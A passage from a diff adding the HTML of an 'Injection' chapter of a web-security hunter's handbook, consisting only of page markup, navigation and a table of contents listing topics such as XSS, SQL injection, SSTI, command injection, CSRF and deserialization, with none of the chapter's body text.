@@ -1,0 +1,2922 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Injection happens when user-controlled data is interpreted as code in a context where it shouldn't be. The question is always — what context does this input land in, and what characters control that context?">
+      
+      
+        <meta name="author" content="Wellington Vumu">
+      
+      
+      
+        <link rel="prev" href="../part-03-access-control/">
+      
+      
+        <link rel="next" href="../part-05-ssrf-xxe/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.39">
+    
+    
+      
+        <title>Injection - Hunter's handbook</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../assets/stylesheets/modern/main.1e981d71.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,500,500i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-header__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hunter's handbook
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-moon" viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-nav__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    Hunter's handbook
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="./.." class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-rocket" viewBox="0 0 24 24"><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09"/><path d="M9 12a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.4 22.4 0 0 1-4 2z"/><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 .05 5 .05"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-01-recon/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-02-authentication/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-round-key" viewBox="0 0 24 24"><path d="M19 11v6M19 13h2M2 21a8 8 0 0 1 12.868-6.349"/><circle cx="10" cy="8" r="5"/><circle cx="19" cy="19" r="2"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-03-access-control/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-lock" viewBox="0 0 24 24"><path d="M19 16v-2a2 2 0 0 0-4 0v2M9.5 15H7a4 4 0 0 0-4 4v2"/><circle cx="10" cy="7" r="4"/><rect width="8" height="5" x="13" y="16" rx=".899"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-syringe" viewBox="0 0 24 24"><path d="m18 2 4 4M17 7l3-3M19 9 8.7 19.3c-1 1-2.5 1-3.4 0l-.6-.6c-1-1-1-2.5 0-3.4L15 5M9 11l4 4M5 19l-3 3M14 4l6 6"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Injection
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-syringe" viewBox="0 0 24 24"><path d="m18 2 4 4M17 7l3-3M19 9 8.7 19.3c-1 1-2.5 1-3.4 0l-.6-.6c-1-1-1-2.5 0-3.4L15 5M9 11l4 4M5 19l-3 3M14 4l6 6"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#41-cross-site-scripting-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1 Cross-Site Scripting (XSS)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.1 Cross-Site Scripting (XSS)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#411-reflected-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.1 Reflected XSS
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#412-stored-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.2 Stored XSS
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#413-dom-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.3 DOM XSS
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#414-xss-filter-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.4 XSS Filter Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#415-xss-to-account-takeover" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.5 XSS to Account Takeover
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#416-csp-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.6 CSP Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#417-xss-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.7 XSS Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#42-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2 SQL Injection
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.2 SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#421-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2.1 Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#422-sqli-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2.2 SQLi Types
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#423-sqlmap-usage-on-live-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2.3 sqlmap Usage on Live Targets
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#424-second-order-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2.4 Second-Order SQLi
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#425-sqli-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2.5 SQLi Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#43-server-side-template-injection-ssti" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.3 Server-Side Template Injection (SSTI)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.3 Server-Side Template Injection (SSTI)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#431-detection-and-engine-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.3.1 Detection and Engine Identification
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#432-rce-payloads-by-engine" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.3.2 RCE Payloads by Engine
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#433-ssti-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.3.3 SSTI Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#44-command-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.4 Command Injection
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.4 Command Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#441-detection-probes" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.4.1 Detection Probes
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#442-blind-oob-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.4.2 Blind OOB Exfiltration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#443-hidden-attack-surfaces" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.4.3 Hidden Attack Surfaces
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#45-cross-site-request-forgery-csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.5 Cross-Site Request Forgery (CSRF)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.5 Cross-Site Request Forgery (CSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#451-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.5.1 Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#452-poc-construction" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.5.2 PoC Construction
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#453-samesite-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.5.3 SameSite Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#46-crlf-injection--header-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.6 CRLF Injection &amp; Header Injection
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.6 CRLF Injection &amp; Header Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#461-detection-and-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.6.1 Detection and Escalation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#47-insecure-deserialization" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.7 Insecure Deserialization
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.7 Insecure Deserialization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#471-identifying-serialized-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.7.1 Identifying Serialized Data
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#472-safe-poc-by-language" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.7.2 Safe PoC by Language
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-4-complete-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Part 4 Complete Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-05-ssrf-xxe/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server" viewBox="0 0 24 24"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><path d="M6 6h.01M6 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF & XXE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-06-business-logic/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain" viewBox="0 0 24 24"><path d="M12 18V5M15 13a4.17 4.17 0 0 1-3-4 4.17 4.17 0 0 1-3 4M17.598 6.5A3 3 0 1 0 12 5a3 3 0 1 0-5.598 1.5"/><path d="M17.997 5.125a4 4 0 0 1 2.526 5.77"/><path d="M18 18a4 4 0 0 0 2-7.464"/><path d="M19.967 17.483A4 4 0 1 1 12 18a4 4 0 1 1-7.967-.517"/><path d="M6 18a4 4 0 0 1-2-7.464"/><path d="M6.003 5.125a4 4 0 0 0-2.526 5.77"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-07-api/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cog" viewBox="0 0 24 24"><path d="M11 10.27 7 3.34M11 13.73l-4 6.93M12 22v-2M12 2v2M14 12h8M17 20.66l-1-1.73M17 3.34l-1 1.73M2 12h2M20.66 17l-1.73-1M20.66 7l-1.73 1M3.34 17l1.73-1M3.34 7l1.73 1"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="12" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    API Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-08-ai-llm/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain-circuit" viewBox="0 0 24 24"><path d="M12 5a3 3 0 1 0-5.997.125 4 4 0 0 0-2.526 5.77 4 4 0 0 0 .556 6.588A4 4 0 1 0 12 18Z"/><path d="M9 13a4.5 4.5 0 0 0 3-4M6.003 5.125A3 3 0 0 0 6.401 6.5M3.477 10.896a4 4 0 0 1 .585-.396M6 18a4 4 0 0 1-1.967-.516M12 13h4M12 18h6a2 2 0 0 1 2 2v1M12 8h8M16 8V5a2 2 0 0 1 2-2"/><circle cx="16" cy="13" r=".5"/><circle cx="18" cy="3" r=".5"/><circle cx="20" cy="21" r=".5"/><circle cx="20" cy="8" r=".5"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    AI & LLM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-09-cloud/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cloud" viewBox="0 0 24 24"><path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-10-mobile/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-smartphone" viewBox="0 0 24 24"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Mobile
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-11-reporting/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-notebook-pen" viewBox="0 0 24 24"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4M2 6h4M2 10h4M2 14h4M2 18h4"/><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reporting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-12-platform/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-layers" viewBox="0 0 24 24"><path d="M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z"/><path d="M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12"/><path d="M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Platform
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-13-tooling/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-wrench" viewBox="0 0 24 24"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.106-3.105c.32-.322.863-.22.983.218a6 6 0 0 1-8.259 7.057l-7.91 7.91a1 1 0 0 1-2.999-3l7.91-7.91a6 6 0 0 1 7.057-8.259c.438.12.54.662.219.984z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Tooling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-14-infrastructure/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server-cog" viewBox="0 0 24 24"><path d="m10.852 14.772-.383.923M13.148 14.772a3 3 0 1 0-2.296-5.544l-.383-.923M13.148 9.228l.383-.923"/><path d="m13.53 15.696-.382-.924a3 3 0 1 1-2.296-5.544M14.772 10.852l.923-.383M14.772 13.148l.923.383"/><path d="M4.5 10H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2h-.5M4.5 14H4a2 2 0 0 0-2 2v4a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-4a2 2 0 0 0-2-2h-.5M6 18h.01M6 6h.01M9.228 10.852l-.923-.383M9.228 13.148l-.923.383"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../appendices/" class="md-nav__link">
+        
+  
+  
